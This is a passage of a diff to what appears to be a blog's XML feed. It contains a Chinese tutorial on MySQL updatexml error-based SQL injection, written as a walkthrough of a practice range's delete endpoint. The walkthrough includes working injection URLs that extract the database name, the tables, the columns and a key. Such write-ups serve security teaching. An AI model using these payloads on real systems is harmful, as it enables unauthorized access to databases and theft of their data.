table_schema='pikaqiu'),0x7e),1)--</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200420111501183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="爆出表名">爆字段名：<code>id,content,time,key</code></p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//219.153.49.228:44138/sqli_del.php?id=62 or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='message'),0x7e),1)--</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200420111653780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="爆出字段名">爆字段内容<code>mozhe763974fe1dfef0196bb79cf034</code></p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//219.153.49.228:44138/sqli_del.php?id=62 or updatexml(1,concat(0x7e,(select `key` from message limit 0,1),0x7e),1)-- </span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200420114743250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="获得字段内容"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
-      
-      
-      <categories>
-          
-          <category> SQL注入 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> updatexml报错注入与delete注入 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>limit后的注入</title>
       <link href="/2019/10/03/limit%E5%90%8E%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
       <url>/2019/10/03/limit%E5%90%8E%E7%9A%84%E6%B3%A8%E5%85%A5/</url>
@@ -498,6 +473,31 @@
         <tags>
             
             <tag> limit后的注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>updatexml报错注入与delete注入</title>
+      <link href="/2019/10/03/updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%B8%8Edelete%E6%B3%A8%E5%85%A5/"/>
+      <url>/2019/10/03/updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%B8%8Edelete%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="updatexml函数介绍："><a href="#updatexml函数介绍：" class="headerlink" title="updatexml函数介绍："></a>updatexml函数介绍：</h2><p>updatexml()更新xml文档的函数<br>语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p><pre class=" language-sql"><code class="language-sql">updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><p>实际上这里是去更新了<code>XML文档</code>，但是我们在XML文档路径的位置里面写入了<code>子查询</code>，我们<code>输入特殊字符，然后就因为不符合输入规则然后报错了</code></p><p>但是报错的时候他其实已经执行了那个子查询代码！</p><p><code>[0x7e</code> 实际是是<code>16进制</code>，<code>Mysql支持16进制</code>，<code>但是开头得写0x</code>    <code>0x7e是一个特殊符号</code>，<code>然后不符合路径规则报错]</code><br> <img src="https://img-blog.csdnimg.cn/20200420120623351.png" alt=""></p><h2 id="updatexml-用法："><a href="#updatexml-用法：" class="headerlink" title="updatexml()用法："></a>updatexml()用法：</h2><p><code>updatexml ()</code> 这个函数一般是<code>配合and 或者是or 使用的</code>，他和联合查询不同，不需要在意什么字段数<br>eg:</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> news <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><p>但是要注意，<code>and</code> 情况下只要一个为<code>False</code>，就会判定是<code>False</code>,所以如果<code>and</code>前面的条件不成立的情况下，就不会执行之后的语句。所以使用的时候建议使用or<br>某些没有回显盲注也可以用这个<code>updatexml()</code>做出来。<br>但是报错一般有长度限制，不能输出太长的数据，尽量不要使用<code>group_concat()</code>。<br><strong>聂风老师说：有些盲注也可以试试看报错注入，因为有的时候报错注入的致命错误会显示出来，数据库只忽略普通报错]</strong></p><h2 id="uodatexml报错注入的实战操作"><a href="#uodatexml报错注入的实战操作" class="headerlink" title="uodatexml报错注入的实战操作"></a>uodatexml报错注入的实战操作</h2><p>这个靶场是<code>delete注入</code>，有一个留言板，添加之后可以删除，删除的时候有一个链接<br>就是找这个链接进行<code>delete注入</code>。<br><img src="https://img-blog.csdnimg.cn/20200420110219968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="删除按钮存在链接">得到这个链接后我们就是尝试注入了，在64后面加个单引号，这时候报错了，说明这里存在sql注入。<br><img src="https://img-blog.csdnimg.cn/20200420110424420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="报错，存在注入">这里没有回显，所以这里使用报错注入。首先先爆库名<code>pikaqiu</code></p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//219.153.49.228:44138/sqli_del.php?id=62 or updatexml(1,concat(0x7e,(select database()),0x7e),1)--</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200420111043665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="爆库名">爆出表名:<code>message</code></p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//219.153.49.228:44138/sqli_del.php?id=62 or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikaqiu'),0x7e),1)--</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200420111501183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="爆出表名">爆字段名：<code>id,content,time,key</code></p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//219.153.49.228:44138/sqli_del.php?id=62 or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='message'),0x7e),1)--</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200420111653780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="爆出字段名">爆字段内容<code>mozhe763974fe1dfef0196bb79cf034</code></p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//219.153.49.228:44138/sqli_del.php?id=62 or updatexml(1,concat(0x7e,(select `key` from message limit 0,1),0x7e),1)-- </span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200420114743250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="获得字段内容"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> updatexml报错注入与delete注入 </tag>
             
         </tags>
       
